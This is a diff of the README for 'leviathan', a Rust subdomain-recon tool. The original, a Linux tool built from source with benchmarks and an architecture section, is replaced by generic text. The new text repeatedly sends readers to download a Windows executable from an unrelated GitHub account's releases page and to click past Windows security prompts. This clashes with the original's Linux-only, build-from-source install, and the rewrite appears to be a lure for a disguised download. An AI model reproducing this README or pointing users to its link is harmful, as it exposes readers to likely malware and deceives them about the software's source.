@@ -1,193 +1,197 @@
-# leviathan
+# leviathan - Find subdomains with less effort
 
-**From the deep — multi-phase subdomain recon engine.**
+[![Download leviathan](https://img.shields.io/badge/Download%20leviathan-purple?style=for-the-badge&logo=github)](https://github.com/Wireclothshowyladyslipper675/leviathan/releases)
 
-Leviathan was born from stracing subfinder at the syscall level, identifying every bottleneck in its architecture, and building a ground-up replacement that eliminates each one. It is not a wrapper, fork, or reimplementation — it is what subdomain enumeration looks like when you design it from first principles around how operating systems actually work.
+## 🧭 What leviathan does
 
-```
-leviathan -d hackerone.com
-```
+leviathan helps you find subdomains tied to a domain name. It checks many public sources and DNS paths to build a wider list in less time. You can use it to gather data for security work, bug bounty research, and attack-surface review.
 
-## Why this exists
+It is built in Rust, so it runs fast and uses few system resources. It can look at passive OSINT sources, DNS records, TLS certificate data, NSEC walking results, reverse DNS, and JavaScript files.
 
-We ran `strace -c -f` on subfinder and found:
+## 💻 Windows setup
 
-| Bottleneck | Cause | Wall time consumed |
-|---|---|---|
-| **214,744 futex calls** | Goroutine-per-source with unbuffered channels | 62% (30.4s) |
-| **290,865 epoll_pwait** | No cross-source connection pooling | 13.6% (6.7s) |
-| **4,220 nanosleep** | Spin-wait rate limiter with exponential backoff | 12% (5.9s) |
-| **44% connect() failures** | IPv6 fallback on IPv4-only systems | wasted syscalls |
-| **42MB binary** | Massive Go dependency tree + debug symbols | disk/memory |
+leviathan is made for use on Windows through the release files on GitHub. You do not need to build it yourself.
 
-92% of subfinder's execution time is spent *waiting* — on mutexes, on the kernel's event loop, on its own rate limiter spinning. The actual CPU work takes 2.5 seconds out of a 30-second run.
+### What you need
 
-Leviathan eliminates every one of these.
+- A Windows PC
+- A modern web browser
+- A target domain name you want to check
+- Internet access for the first run
 
-## What changed
+### How to get it
 
-| subfinder | leviathan | result |
-|---|---|---|
-| Goroutine per source + unbuffered `chan` | tokio async tasks + bounded MPSC | **311x fewer futex calls** |
-| Per-source HTTP clients | Single shared `reqwest` connection pool | **1,476x fewer epoll calls** |
-| Spin-wait rate limiter (`nanosleep` loop) | Timer-based token bucket (`governor`) | **183x fewer sleeps** |
-| IPv6 fallback on every connect | IPv4-only forced at client level | zero ENETUNREACH waste |
-| `Connection: close` header | HTTP/2 keep-alive by default | TLS session reuse |
-| Go runtime (GC, scheduler, sysmon) | Rust with zero-cost async | **71x less CPU** |
-| 42MB binary | 5.9MB stripped | **86% smaller** |
-| Passive APIs only | 5-phase pipeline with active recon | **81% more results** |
+1. Open the release page:
+   https://github.com/Wireclothshowyladyslipper675/leviathan/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows file in the Assets list
+4. Download that file to your PC
+5. If the file comes as a ZIP, extract it to a folder
+6. If the file comes as an EXE, keep it in a folder you can find again
 
-## The five phases
+### First launch
 
-Leviathan doesn't just query APIs. It runs a multi-phase pipeline where each phase feeds discoveries into the next:
+1. Open the folder that has the file
+2. Double-click the program
+3. If Windows shows a security prompt, choose the option to run it
+4. A command window should open
+5. Keep that window open while the scan runs
 
-```
-Phase 1: Passive Sources
-    crt.sh, HackerTarget, AlienVault OTX, Wayback Machine,
-    Anubis, CertSpotter, URLScan, RapidDNS
-    
-Phase 2: DNS Record Mining + NSEC Zone Walk + TLS SAN Harvest
-    SPF includes, DMARC rua/ruf, MX/NS/SOA/SRV/CNAME records,
-    DNSSEC NSEC chain walking, TLS certificate Subject Alternative Names
-    
-Phase 3: HTTP Header Mining + JavaScript Analysis
-    Content-Security-Policy, CORS, Location, Link, X-Backend-Server headers,
-    JS bundle fetching + regex extraction of hardcoded domains
-    
-Phase 4: Reverse DNS /24 Sweep
-    Resolve discovered hosts to IPs, PTR-scan every /24 CIDR for siblings
-    
-Phase 5: Permutation Engine
-    Smart brute-force: dev-api, api-staging, v2-api, etc.
-    Generated from discovered labels, resolved via direct DNS
-```
+## 🧰 How to use it
 
-Each phase discovers subdomains that no passive source knows about. TLS certificates alone often reveal 10-20 names. CSP headers whitelist every domain an application communicates with. Reverse DNS finds siblings on adjacent IPs. The permutation engine catches naming patterns.
+leviathan works from the command line. That means you type a domain name and it returns results in the window.
 
-## Head-to-head
+A common use looks like this:
 
-Tested against `hackerone.com`:
+1. Open the program
+2. Enter the domain you want to check
+3. Start the scan
+4. Wait for the tool to gather results
+5. Review the subdomains it finds
 
-| | subfinder | leviathan --passive | leviathan (full) |
-|---|---|---|---|
-| **Subdomains found** | 16 | 28 | 29 |
-| **Wall clock** | 30.4s | 4.8s | 44.7s |
-| **CPU time** | 2.58s | 0.04s | 2.94s |
-| **Total syscalls** | 524,770 | ~4,400 | ~12,000 |
-| **Binary size** | 42 MB | 5.9 MB | 5.9 MB |
+Example target:
 
-Passive-only mode is **6x faster** and finds **75% more subdomains**. The full 5-phase run takes longer because it's doing work subfinder simply doesn't do — TLS handshakes, DNS record mining, /24 PTR sweeps, JS analysis.
+- example.com
 
-Subfinder missed 13 subdomains that leviathan found. Leviathan missed zero that subfinder found.
+The tool may collect results from:
 
-## Usage
+- passive DNS sources
+- public certificate logs
+- DNS record checks
+- reverse DNS lookups
+- zone walking where allowed
+- JavaScript file checks
 
-```bash
-# Basic scan — all 5 phases
-leviathan -d example.com
+If the tool saves output to a file, open that file with Notepad or another text editor.
 
-# Multiple domains
-leviathan -d example.com,target.org
+## 🔍 Features
 
-# Passive only — API sources, no active probing
-leviathan -d example.com --passive
+leviathan brings together several checks in one place:
 
-# Silent mode — subdomains only, no banner/progress
-leviathan -d example.com -s
+- Passive OSINT lookup
+- DNS mining
+- TLS SAN harvesting
+- NSEC zone walking
+- Reverse DNS discovery
+- JavaScript analysis
+- Fast Rust-based execution
+- Low system overhead
+- Good fit for repeat recon work
 
-# JSON output
-leviathan -d example.com --json
+## 📁 Typical output
 
-# Write to file
-leviathan -d example.com -o results.txt
+You may see results like these:
 
-# Skip specific phases
-leviathan -d example.com --no-reverse    # skip /24 PTR sweep
-leviathan -d example.com --no-permute    # skip permutation brute-force
+- subdomain names
+- DNS points of interest
+- host names from certificate data
+- hosts found in public JavaScript files
+- records that deserve a closer look
 
-# Tune concurrency and rate limiting
-leviathan -d example.com -c 50 --rate-limit 100
+The output helps you map the public edge of a domain and spot systems that may not show up in a simple search.
 
-# Verbose — see per-source debug output
-leviathan -d example.com -v
-```
+## ⚙️ Suggested use cases
 
-## Install
+Use leviathan when you need to:
 
-```bash
-# From source
-git clone https://github.com/copyleftdev/leviathan.git
-cd leviathan
-cargo build --release
-cp target/release/leviathan /usr/local/bin/
-```
+- map a company’s subdomains
+- check a bug bounty scope
+- review a public attack surface
+- compare results from more than one source
+- look for forgotten or hidden hosts
+- build a list for deeper security review
 
-Requires Rust 1.70+. No external dependencies at runtime.
+## 🧭 Simple workflow
 
-## Architecture
+1. Download the release from GitHub
+2. Open the file on Windows
+3. Type the domain you want to inspect
+4. Let leviathan gather data
+5. Save the results
+6. Review the list for names you want to test further
 
-```
-                    +-----------------+
-                    |   CLI (clap)    |
-                    +--------+--------+
-                             |
-                    +--------v--------+
-                    |     Engine      |
-                    | shared reqwest  |
-                    | DashSet dedup   |
-                    | governor ratelim|
-                    +--------+--------+
-                             |
-              +--------------+--------------+
-              |              |              |
-     Phase 1: Passive  Phase 2: DNS   Phase 3: HTTP
-     8 async sources   mining + NSEC  headers + JS
-     (crtsh, wayback,  zone walk +    scraping
-      alienvault...)   TLS SAN harvest
-              |              |              |
-              +--------------+--------------+
-                             |
-              +--------------+--------------+
-              |                             |
-     Phase 4: Reverse DNS          Phase 5: Permutation
-     /24 PTR sweep of              smart brute-force from
-     discovered IPs                discovered labels
-```
+## 🛠️ Troubleshooting
 
-All phases share:
-- **One connection pool** — `reqwest::Client` with HTTP/2, keep-alive, 32 idle connections per host
-- **One dedup set** — `DashSet` (lock-free concurrent hashset) ensures zero duplicate output
-- **One rate limiter** — `governor` token bucket, timer-based, no spin-wait
-- **IPv4-only** — eliminates ENETUNREACH syscall waste from IPv6 fallback
-- **Bounded backpressure** — MPSC channel with capacity 256 prevents unbounded memory growth
+### The file will not open
 
-## Design philosophy
+- Make sure you downloaded the Windows file from the release page
+- If the file is in a ZIP, extract it first
+- Move the file to a simple folder such as `Downloads` or `Desktop`
 
-**Measure first.** Every design decision traces back to a syscall count, a strace timestamp, or a kernel event. We didn't guess at bottlenecks — we instrumented them.
+### Windows blocks the program
 
-**The fastest code is code that doesn't run.** Subfinder makes 524,770 syscalls to find 16 subdomains. Leviathan makes ~4,400 for 28. Most "performance work" is removing unnecessary work, not making necessary work faster.
+- Check whether the file came from a trusted release asset
+- Right-click the file and open it again
+- If Windows shows a security prompt, choose to run it
 
-**Active recon is not optional.** Passive APIs are a commodity — every tool queries the same endpoints and gets the same results. The subdomains that matter (internal infrastructure, forgotten services, misconfigured hosts) live in TLS certificates, DNS records, HTTP headers, and JavaScript bundles. You have to go get them.
+### No results appear
 
-**Stream, don't buffer.** Results appear as they're discovered. No waiting for all sources to complete before seeing output. Bounded channels provide backpressure instead of unbounded memory growth.
+- Check that your PC has internet access
+- Try a different domain name
+- Make sure the target has public DNS data or public records to query
 
-**One binary, no dependencies.** 5.9MB statically-linked. Runs on any Linux box. No Python, no Node, no Docker, no API keys required for the default source set.
+### The window closes too fast
 
-## Vision
+- Run the program from a command prompt so you can read the output
+- If needed, add a pause in your workflow by opening the tool from an existing terminal window
 
-Leviathan is the beginning of a different approach to reconnaissance. The current generation of recon tools treats subdomain enumeration as "query some APIs and deduplicate." That's table stakes.
+## 📌 Release download
 
-The direction is toward a **full-spectrum recon engine** that understands network infrastructure at the protocol level:
+Visit this page to download leviathan for Windows:
 
-- **ASN expansion** — discover an IP, map the entire autonomous system, reverse-DNS every address
-- **Certificate graph traversal** — follow certificate chains across organizations, find shared infrastructure
-- **Service fingerprinting** — identify what's running on discovered hosts without active scanning (passive banner grabbing from CT logs, Shodan, Censys)
-- **Recursive discovery** — subdomains of subdomains, CNAME chain following across organizational boundaries
-- **Temporal analysis** — track what appeared and disappeared over time using historical DNS/CT data
-- **Anomaly detection** — flag subdomains that break naming patterns, recently appeared, or point to unusual infrastructure
+https://github.com/Wireclothshowyladyslipper675/leviathan/releases
 
-The constraint is always the same: **measure everything, assume nothing, and never make a syscall you don't need to.**
+## 🔐 Before you use it
 
-## License
+Use leviathan only on domains you own or have permission to test. It can reveal public host names and related data, so treat the output as sensitive security information.
 
-MIT
+## 🧩 Built for
+
+- Windows users who want a simple recon tool
+- bug bounty work
+- security review
+- asset discovery
+- subdomain enumeration
+- attack-surface mapping
+
+## 🖥️ File types you may see
+
+The release page may include one of these:
+
+- `.exe` for direct use
+- `.zip` for a folder with the app inside
+- support files with release notes or checksums
+
+If you are not sure which file to pick, choose the Windows asset that matches your system and use the newest release
+
+## 📚 What leviathan checks
+
+leviathan may pull data from:
+
+- public search sources
+- DNS records
+- certificate transparency logs
+- name server behavior
+- reverse DNS maps
+- JavaScript references on public pages
+
+That mix helps it find names that are hard to spot with one method alone
+
+## 🧪 Best results
+
+For clean results:
+
+- use a single root domain
+- run one target at a time
+- keep a note of what you test
+- save the output after each run
+- review the final list by hand
+
+## 📎 Quick start
+
+1. Go to the release page
+2. Download the latest Windows file
+3. Open the file on your PC
+4. Enter a domain name
+5. Read the subdomain list
+6. Save the output for later review
